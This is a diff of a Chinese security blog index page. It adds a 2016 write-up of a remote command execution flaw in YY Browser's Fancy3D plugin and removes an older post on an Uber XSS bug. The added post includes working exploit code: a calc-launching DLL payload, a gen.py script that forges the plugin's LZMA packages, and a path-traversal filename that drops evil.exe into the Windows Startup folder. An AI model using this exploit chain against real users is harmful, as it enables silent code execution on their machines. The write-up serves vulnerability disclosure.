@@ -259,6 +259,152 @@
             
               
                 
+                <a class="post-title-link" href="/2016/10/15/YY-Browser-RCE/" itemprop="url">
+                  [浏览器安全系列四] Fancy3D引擎（YY浏览器）远程命令执行
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-10-15T16:58:50+08:00" content="2016-10-15">
+              2016-10-15
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/10/15/YY-Browser-RCE/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/10/15/YY-Browser-RCE/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>案例链接：<a href="http://www.wooyun.org/bugs/wooyun-2016-0221080" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0221080</a></p>
+<p>这是浏览器安全系列的最后一篇文章（就目前情况而言）了，静待乌云归来。</p>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在研究YY浏览器的默认游戏助手插件时，在代码里面找到一个游戏的名字：jzwl，于是在YY的游戏中心搜索了一下，找到了下面这个页面：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//udblogin</span>.duowan.com/login.<span class="keyword">do</span>?online&amp;report_ver=new&amp;showtools=<span class="number">0</span>&amp;webyygame&amp;pro=webyygame&amp;rso=FROM_SCTG&amp;rso_desc=<span class="variable">%E5</span><span class="variable">%B8</span><span class="variable">%82</span><span class="variable">%E5</span><span class="variable">%9C</span><span class="variable">%BA</span><span class="variable">%E6</span><span class="variable">%8E</span><span class="variable">%A8</span><span class="variable">%E5</span><span class="variable">%B9</span><span class="variable">%BF</span>&amp;<span class="keyword">ref</span>=gw/entergame&amp;ref_desc=<span class="variable">%E5</span><span class="variable">%AE</span><span class="variable">%98</span><span class="variable">%E7</span><span class="variable">%BD</span><span class="variable">%91</span><span class="variable">%2f</span><span class="variable">%E8</span><span class="variable">%BF</span><span class="variable">%9B</span><span class="variable">%E5</span><span class="variable">%85</span><span class="variable">%A5</span><span class="variable">%E6</span><span class="variable">%B8</span><span class="variable">%B8</span><span class="variable">%E6</span><span class="variable">%88</span><span class="variable">%8F</span>&amp;game=JZWL&amp;server=s6</span><br></pre></td></tr></table></figure>
+<p>点开这个页面的时候，我电脑上的腾讯安全管家弹出了下载文件的提示，仔细一看，我擦，自动下载了这么多文件下来！于是我觉得可以研究研究这个东西。<br><img src="http://ww2.sinaimg.cn/large/7184df6bgw1f4xgo3kp46j20mb0htn3y.jpg" alt=""></p>
+<p>发现页面中有这样的一段代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"flash"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">object</span> <span class="attribute">id</span>=<span class="value">"fancy3d"</span> <span class="attribute">type</span>=<span class="value">"application/fancy-npruntime-fancy3d-plugin"</span> <span class="attribute">width</span>=<span class="value">"100%"</span> <span class="attribute">height</span>=<span class="value">"198"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"game"</span> <span class="attribute">value</span>=<span class="value">"jzwl"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"nprver"</span> <span class="attribute">value</span>=<span class="value">"0.0.2.17"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"ocxver"</span> <span class="attribute">value</span>=<span class="value">"0.0.2.17"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"liburl"</span> <span class="attribute">value</span>=<span class="value">"http://loader.52xiyou.zsgl.ate.cn/jzwl/loader/loaderUpdater.71f24efc47252dee7ca07eb571bd6f50.dll"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"libmd5"</span> <span class="attribute">value</span>=<span class="value">"71f24efc47252dee7ca07eb571bd6f50"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"unsafelib"</span> <span class="attribute">value</span>=<span class="value">"allow"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"param1"</span> <span class="attribute">value</span>=<span class="value">"cmdline=uid:1576442523|skey:6|platform:duowan|sign:7115344fa13ccca8950cfea0484437ce|type:web"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"param2"</span> <span class="attribute">value</span>=<span class="value">"client_root_url=http://res.jzwl.52xiyou.com/client/"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"param3"</span> <span class="attribute">value</span>=<span class="value">"ip_port=[121.46.21.176,121.46.21.176,121.46.21.176,121.46.21.176]|[8092]"</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"param5"</span> <span class="attribute">value</span>=<span class="value">"loader_root_url=http://res.jzwl.52xiyou.com/loader/"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"param6"</span> <span class="attribute">value</span>=<span class="value">"loader_ver_name=loader.ver"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"param7"</span> <span class="attribute">value</span>=<span class="value">"loader_catalog_name=loader_catalog.txt"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="title">param</span> <span class="attribute">name</span>=<span class="value">"param8"</span> <span class="attribute">value</span>=<span class="value">"loader_name=loaderjz.dll"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我擦！这个好像在哪里见过的：<a href="http://wooyun.org/bugs/wooyun-2016-0172781" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2016-0172781</a> 我们开始分析吧！</p>
+<h2 id="0x00-这个插件是哪里来的？"><a href="#0x00-这个插件是哪里来的？" class="headerlink" title="0x00 这个插件是哪里来的？"></a>0x00 这个插件是哪里来的？</h2><p>YY浏览器启动的时候会检查注册表中是否已经安装有Fancy3D游戏引擎这个NPAPI插件，具体路径如下。如果不存在，则会自动静悄悄地帮用户安装上。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\MozillaPlugins\@fancyguo.com/FancyGame,version=<span class="number">1.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://ww2.sinaimg.cn/large/7184df6bgw1f4xg9lwxk8j20ru07cwi6.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f4xgbxgu0rj20qe04itaj.jpg" alt=""></p>
+<h2 id="0x01-插件功能分析"><a href="#0x01-插件功能分析" class="headerlink" title="0x01 插件功能分析"></a>0x01 插件功能分析</h2><p><code>libcurl</code>和<code>libcmd5</code>这两个参数在 <a href="http://wooyun.org/bugs/wooyun-2016-0172781" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2016-0172781</a> 已经分析过，这里更简单，连域名白名单限制都没有做，直接修改成为自己的域名都会请求，一开始我以为是可以直接搞定的。但实验过后发现，自己写的dll按照规则放进去之后并没有加载到进程中。进一步查看信息，发现360浏览器那个洞里出现的游戏提供方好像是同一家公司，看样子是做了数字签名，没什么好方法，先放一边。</p>
+<p>里面还有几个参数，看上去也是会下载文件，把<code>&lt;param name=&quot;param5&quot; value=&quot;loader_root_url=http://a.com/loader/&quot;&gt;</code>改成自己本地的地址（注：我在Hosts文件里做了<code>127.0.0.1 a.com</code>映射）看看它都会请求下载哪些东西。测试过后，发现过程如下：</p>
+<ol>
+<li>下载loader_root_url + loader_ver_name，即这个文件：<a href="http://res.jzwl.52xiyou.com/loader/loader.ver" target="_blank" rel="external">http://res.jzwl.52xiyou.com/loader/loader.ver</a> ，其内容为<code>2016-06-02</code></li>
+<li><p>下载loader_root_url + 2016-06-02/loader_catalog.txt，即：<a href="http://res.jzwl.52xiyou.com/loader/2016-06-02/loader_catalog.txt" target="_blank" rel="external">http://res.jzwl.52xiyou.com/loader/2016-06-02/loader_catalog.txt</a> ， 其内容如下：</p>
+ <figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl.exe.lzma||<span class="string">3b0c063789066f74667efc13db00e9cc</span>||<span class="string">247772</span>||<span class="string">f4edf7cab0d6a404b77eb816c996831c</span>||506048</span><br><span class="line">jztr.exe.lzma||<span class="string">c5dbe14ad37375371cb79261b848bcc8</span>||<span class="string">69086</span>||<span class="string">339068e9b3286cb30e100c398ea632f1</span>||154816</span><br><span class="line">flash.ocx.lzma||<span class="string">b2a9e2cdb422b3a71558ad9b6acc4ec8</span>||<span class="string">1701337</span>||<span class="string">8afc17155ed5ab60b7c52d7f553d579c</span>||3866528</span><br><span class="line">loading.swf.lzma||<span class="string">a77c04de83da48dcbb6b15c9028829a7</span>||<span class="string">961202</span>||<span class="string">5f52ea04bc871804c0c059a82053894c</span>||950321</span><br><span class="line">loaderjz.dll.lzma||<span class="string">4a51f304098ccebcecdf238ff3736d60</span>||<span class="string">350535</span>||<span class="string">2f22bb87e00681d858e3bd6013843231</span>||804496</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下载上面的文件，并执行加载游戏的一些操作。通过procexp.exe查看相应YY浏览器的NPAPI的进程，发现其动态加载的dll中，果然有<code>loaderjz.dll</code>这个文件。</p>
+<p> 目录结构如下：</p>
+ <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">│───poc<span class="class">.html</span></span><br><span class="line">│</span><br><span class="line">└───loader</span><br><span class="line">    │   loader<span class="class">.ver</span></span><br><span class="line">    └───<span class="number">2016</span>-<span class="number">06</span>-<span class="number">02</span></span><br><span class="line">            curl<span class="class">.exe</span><span class="class">.lzma</span></span><br><span class="line">            flash<span class="class">.ocx</span><span class="class">.lzma</span></span><br><span class="line">            jztr<span class="class">.exe</span><span class="class">.lzma</span></span><br><span class="line">            loaderjz<span class="class">.dll</span><span class="class">.lzma</span></span><br><span class="line">            loader_catalog<span class="class">.txt</span></span><br><span class="line">            loading<span class="class">.swf</span><span class="class">.lzma</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="0x02-分析文件格式"><a href="#0x02-分析文件格式" class="headerlink" title="0x02 分析文件格式"></a>0x02 分析文件格式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk curl.exe.lzma</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"><span class="number">42</span>            <span class="number">0</span>x2A            LZMA compressed data, properties: <span class="number">0</span>x5D, dictionary size: <span class="number">16777216</span> bytes, uncompressed size: <span class="number">506048</span> bytes</span><br></pre></td></tr></table></figure>
+<p>观察每个文件，发现它们都有一个不定长的头部信息，然后是<code>LZMA:24</code>算法压缩的数据包，Google之后猜测是使用这里的工具开发的：<a href="http://www.7-zip.org/sdk.html" target="_blank" rel="external">http://www.7-zip.org/sdk.html</a></p>
+<p>接下来分析一下头部信息都是些什么东西。注：这里用的是小端规则。<br><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f4xie83ou5j20hp030jt7.jpg" alt=""></p>
+<ul>
+<li>00 - 03 字节：29 00 00 00 = 0x29 = 41，正好是上面binwalk分析出来的头部长度。</li>
+<li>04 - 07 字节：B3 C7 03 00 = 0x03C7B3 = 247731，是loader_catalog.txt文件中 247772 - 41 得到的，而247772是curl.exe.lzma文件的大小。最终，通过<code>binwalk -e</code>解压开文件，发现就是加了头部信息之前的文件的大小 + 1</li>
+<li>08 - 11 字节：C0 B8 07 00 = 0x07B8C0 = 506048，应该就是解压后文件的大小</li>
+<li>12 - 13 字节：09 00 = 9，刚好就是字符串<code>curl.exe</code>的长度，注意结尾的<code>\0</code></li>
+<li>14 - 15 字节：11 00，暂时没猜到</li>
+<li>16 - 31 字节：00000000000000000000000000000000</li>
+<li>32 - 40 字节：6375726C2E65786500 = <code>curl.exe</code></li>
+</ul>
+<h2 id="0x03-劫持loaderjz-dll-lzma这个文件实现远程命令执行"><a href="#0x03-劫持loaderjz-dll-lzma这个文件实现远程命令执行" class="headerlink" title="0x03 劫持loaderjz.dll.lzma这个文件实现远程命令执行"></a>0x03 劫持loaderjz.dll.lzma这个文件实现远程命令执行</h2><p>首先，自己实现一个dll文件，在其<code>DllMain</code>入口函数的时候中启动一下计算器就好，代码如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span><br><span class="line">	DWORD  ul_reason_for_call,</span><br><span class="line">	LPVOID lpReserved</span><br><span class="line">)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		WinExec(<span class="string">"calc"</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译成Release版本，改名，使用 <a href="http://www.7-zip.org/sdk.html" target="_blank" rel="external">http://www.7-zip.org/sdk.html</a> 这里下载得到的lzma.exe压缩一下文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\lzma\bin&gt;lzma.exe e loaderjz.dll loaderjz.dll.lzma <span class="operator">-d</span>24</span><br><span class="line"></span><br><span class="line">LZMA <span class="number">16.02</span> : Igor Pavlov : Public domain : <span class="number">2016</span>-<span class="number">05</span>-<span class="number">21</span></span><br><span class="line"></span><br><span class="line">Input size:  <span class="number">12288</span> (<span class="number">0</span> MiB)</span><br><span class="line">Output size: <span class="number">5748</span> (<span class="number">0</span> MiB)</span><br></pre></td></tr></table></figure></p>
+<p>接着使用脚本gen.py（见测试代码）生成带有头部信息的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python gen.py loaderjz.dll</span><br><span class="line">output.lzma||<span class="number">3</span>a94912118bc172065d643e1aa847b0d||<span class="number">5794</span>||<span class="number">9</span>bc1ee40c622a0d7a1f96a6c9119bbe6||<span class="number">12288</span></span><br></pre></td></tr></table></figure></p>
+<p>将生成的output.lzma覆盖<code>loaderjz.dll.lzma</code>，并将<code>loader_catalog.txt</code>中的值修改成上述命令的输出，使用YY浏览器访问测试页面。就可以执行任意程序了。</p>
+<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f4y97swvl3g20qu0h979t.gif" alt=""></p>
+<h2 id="0x04-任意路径写入漏洞导致RCE"><a href="#0x04-任意路径写入漏洞导致RCE" class="headerlink" title="0x04 任意路径写入漏洞导致RCE"></a>0x04 任意路径写入漏洞导致RCE</h2><p>在测试的过程中，我还发现头部信息中的文件名可以使用<code>..</code>跳转到上一级目录中，也就是说我们可以利用这个点来将一个可执行文件写入到用户的启动目录中。在生成头部信息时，只需要使用文件名：<code>..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe</code>，YY浏览器在下载这个生成的lzma文件之后就会自动将这个文件写入到启动目录中。</p>
+<p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f4y9vhta2qj20lu06rabw.jpg" alt=""></p>
+<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><p>gen.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">inputFileName = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#fileName = "..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe"</span></span><br><span class="line">fileName = <span class="string">"loaderjz.dll"</span></span><br><span class="line">fileNameLength = len(fileName) + <span class="number">1</span></span><br><span class="line">lzmaFile = inputFileName + <span class="string">".lzma"</span></span><br><span class="line">outputFile = <span class="string">"output.lzma"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(fname)</span>:</span></span><br><span class="line">    hash_md5 = hashlib.md5()</span><br><span class="line">    <span class="keyword">with</span> open(fname, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> iter(<span class="keyword">lambda</span>: f.read(<span class="number">4096</span>), <span class="string">b""</span>):</span><br><span class="line">            hash_md5.update(chunk)</span><br><span class="line">    <span class="keyword">return</span> hash_md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(outputFile, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, <span class="number">32</span> + fileNameLength))</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, os.path.getsize(lzmaFile) + <span class="number">1</span>))</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, os.path.getsize(inputFileName)))</span><br><span class="line">    f.write(struct.pack(<span class="string">'H'</span>, fileNameLength))</span><br><span class="line">    f.write(struct.pack(<span class="string">'H'</span>, <span class="number">0x11</span>))</span><br><span class="line">    f.write(<span class="string">'\x00'</span> * <span class="number">16</span>)</span><br><span class="line">    f.write(fileName)</span><br><span class="line">    f.write(<span class="string">'\x00'</span> * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">with</span> open(lzmaFile, <span class="string">"rb"</span>) <span class="keyword">as</span> lzmaF:</span><br><span class="line">        f.write(lzmaF.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> outputFile + <span class="string">"||"</span> + md5(outputFile) + <span class="string">"||"</span> + str(os.path.getsize(outputFile)) +\</span><br><span class="line">        <span class="string">"||"</span> + md5(inputFileName) + <span class="string">"||"</span> + str(os.path.getsize(inputFileName))</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/10/06/Sogou-Browser-RCE/" itemprop="url">
                   [浏览器安全系列三] 搜狗浏览器从UXSS到远程命令执行
                 </a>
@@ -370,121 +516,11 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/09/10/A-Valuable-XSS/" itemprop="url">
-                  [BBP系列一] 人生第一个值钱的XSS漏洞
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-09-10T20:40:17+08:00" content="2016-09-10">
-              2016-09-10
-            </time>
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/09/10/A-Valuable-XSS/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/09/10/A-Valuable-XSS/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。</p>
-<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>在看Uber的网站前端JS代码的时候，发现有如下的一段代码：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> k = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);  <span class="comment">// 创建script标签</span></span><br><span class="line">    k.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    k.async = <span class="literal">true</span>;</span><br><span class="line">    k.setAttribute(<span class="string">"data-id"</span>, u.pubid);</span><br><span class="line">    k.className = <span class="string">"kxct"</span>;</span><br><span class="line">    k.setAttribute(<span class="string">"data-version"</span>, <span class="string">"1.9"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从location.href参数中读取kxsrc</span></span><br><span class="line">    <span class="keyword">var</span> m, src = (m = location.href.match(<span class="regexp">/\bkxsrc=([^&amp;]+)/</span>)) &amp;&amp; <span class="built_in">decodeURIComponent</span>(m[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查kxsrc参数的值是否满足正则，如果满足则加载，否则加载默认的JS文件 </span></span><br><span class="line">    k.src = <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(src) ? src : src === <span class="string">"disable"</span> ? <span class="string">""</span> : (location.protocol === <span class="string">"https:"</span> ? <span class="string">"https:"</span> : <span class="string">"http:"</span>) + <span class="string">"//cdn.krxd.net/controltag?confid="</span> + u.pubid;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'script'</span>)[<span class="number">0</span>];</span><br><span class="line">    s.parentNode.insertBefore(k, s);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-<p>目前代码还能在：<a href="https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js" target="_blank" rel="external">https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js</a> 看到，不过修复之后相应的网站已经不会加载这个代码文件了。 通过阅读上面这段代码，我们能够知道参数是<code>kxsrc</code>是可以被用户控制的，而且如果满足一定条件，该参数所指定的js文件就会被加载。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>咋一看，这段代码似乎没有什么问题：JS文件只能是<code>krxd.net</code>域下的文件。然而，在正则表达式里：<code>.</code>代表的意思是匹配任意字符。我们来做一个简单的实验，F12打开浏览器的调试窗口：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.bkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.ckrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.dkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.ekrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.fkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://aafkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://abfkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>
